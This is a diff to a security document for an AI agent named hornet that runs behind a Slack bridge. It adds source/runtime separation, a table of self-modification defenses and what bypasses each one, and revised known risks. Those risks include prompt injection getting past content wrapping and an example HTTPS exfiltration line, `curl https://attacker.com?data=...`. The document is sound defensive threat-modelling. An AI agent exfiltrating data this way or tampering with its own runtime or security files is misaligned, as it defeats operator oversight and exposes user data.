@@ -1,5 +1,31 @@
 # Security
 
+## Architecture: Source / Runtime Separation
+
+```
+~/hornet/                              ← READ-ONLY source repo (admin-managed)
+  ├── pi/extensions/                   ← source of truth for extensions
+  ├── pi/skills/                       ← source of truth for skill templates
+  ├── bin/                             ← admin scripts (deploy.sh, audit, firewall)
+  └── slack-bridge/                    ← source of truth for bridge
+
+~/.pi/agent/
+  ├── extensions/                      ← DEPLOYED copies (real dir, not symlink)
+  │   ├── tool-guard.ts               ← security-critical (deployed by admin)
+  │   ├── auto-name.ts                ← agent-modifiable
+  │   └── ...
+  └── skills/                          ← agent-owned (agent updates freely)
+
+~/runtime/
+  └── slack-bridge/                    ← DEPLOYED copy (bridge runs from here)
+      ├── bridge.mjs                   ← agent-modifiable
+      ├── security.mjs                 ← security-critical (deployed by admin)
+      └── node_modules/
+```
+
+The agent runs from deployed copies, never from the source repo directly.
+Admin edits source → runs `bin/deploy.sh` → copies to runtime with correct permissions.
+
 ## Trust Boundaries
 
 ```
@@ -20,7 +46,8 @@
 ┌─────────────────────────────────────────────────────────────────┐
 │               BOUNDARY 2: OS User Isolation                      │
 │   hornet_agent (uid 1001) — separate home, no sudo              │
-│   Cannot read admin home directory (admin home is 700)            │
+│   Cannot read admin home directory (admin home is 700)           │
+│   Source repo ~/hornet/ is read-only (permissions + tool-guard)  │
 │   Docker only via wrapper (blocks --privileged, host mounts)     │
 └──────────────────────────────┬──────────────────────────────────┘
                                │
@@ -32,6 +59,18 @@
 │   Localhost: bridge API, postgres, ollama                         │
 └─────────────────────────────────────────────────────────────────┘
 ```
+
+## Self-Modification Defense
+
+| Layer | What | Bypassed by |
+|-------|------|-------------|
+| **Read-only source** | ~/hornet/ has no write permissions for agent; bind mount (if applied via setup.sh) is kernel-enforced | Root access |
+| **Tool-guard rules** | Blocks write/edit to ~/hornet/ AND runtime security files; blocks chmod/chown on ~/hornet/ | None (compiled into extension) |
+| **Integrity checks** | security-audit.sh compares runtime file hashes against source | None (detection, not prevention) |
+| **Pre-commit hook** | Blocks git commit of protected files in source repo | --no-verify (root-owned hook) |
+
+The read-only source repo is the primary defense. Even if the agent modifies runtime copies,
+the admin can re-deploy from the untampered source at any time.
 
 ## User Model
 
@@ -73,25 +112,40 @@ Slack @mention
 | `SLACK_BOT_TOKEN` | Bridge `.env` | `600` | Slack bot OAuth token |
 | `SLACK_APP_TOKEN` | Bridge `.env` | `600` | Slack Socket Mode token |
 
+## Deploy Workflow
+
+```bash
+# Admin edits source files in ~/hornet/
+# Then deploys to runtime:
+sudo ~/hornet/bin/deploy.sh
+
+# If bridge is running, restart it:
+sudo -u hornet_agent bash -c 'cd ~/runtime/slack-bridge && node bridge.mjs'
+```
+
 ## Known Risks
 
 ### Agent has unrestricted shell
-Within its own user permissions, `hornet_agent` can run any command. There is no tool policy layer, command allowlist, or exec approval system. A prompt injection that bypasses the content wrapping could instruct the agent to run arbitrary commands as `hornet_agent`.
+Within its own user permissions, `hornet_agent` can run any command. The tool-guard and safe-bash wrapper block known-dangerous patterns, but a prompt injection could attempt novel commands.
+
+### Agent can modify its own runtime files
+The deployed copies of non-security files (bridge.mjs, skills, most extensions) are agent-writable by design. The agent could modify these. Security-critical files (tool-guard.ts, security.mjs) are write-protected at the filesystem level and monitored via integrity checks.
 
 ### Agent has internet access
-Even with port-based firewall rules, the agent can reach any host over HTTPS. Data exfiltration via `curl https://attacker.com?data=...` is possible. The firewall blocks reverse shells and non-standard ports but does not prevent HTTPS exfil.
+Even with port-based firewall rules, the agent can reach any host over HTTPS. Data exfiltration via `curl https://attacker.com?data=...` is possible.
 
 ### Content wrapping is a soft defense
-The `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` boundaries and security notice ask the LLM to ignore injected instructions. This raises the bar but is not a hard security boundary — sufficiently clever injections may still succeed.
+The `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` boundaries and security notice ask the LLM to ignore injected instructions. This raises the bar but is not a hard security boundary.
 
 ### Session logs contain full history
-Pi session logs (`.jsonl` files) contain the complete conversation history including tool calls, file contents, and command outputs. If permissions are not hardened (see `bin/harden-permissions.sh`), these are group-readable.
+Pi session logs (`.jsonl` files) contain the complete conversation history. If permissions are not hardened (see `bin/harden-permissions.sh`), these are group-readable.
 
 ## Security Scripts
 
 | Script | Purpose | Run as |
 |--------|---------|--------|
-| `bin/security-audit.sh` | Check current security posture | hornet_agent or admin |
+| `bin/security-audit.sh` | Check current security posture + integrity checks | hornet_agent or admin |
+| `bin/deploy.sh` | Deploy from source to runtime with correct permissions | root or admin |
 | `bin/harden-permissions.sh` | Lock down pi state file permissions | hornet_agent |
 | `bin/setup-firewall.sh` | Apply port-based network restrictions | root |
 
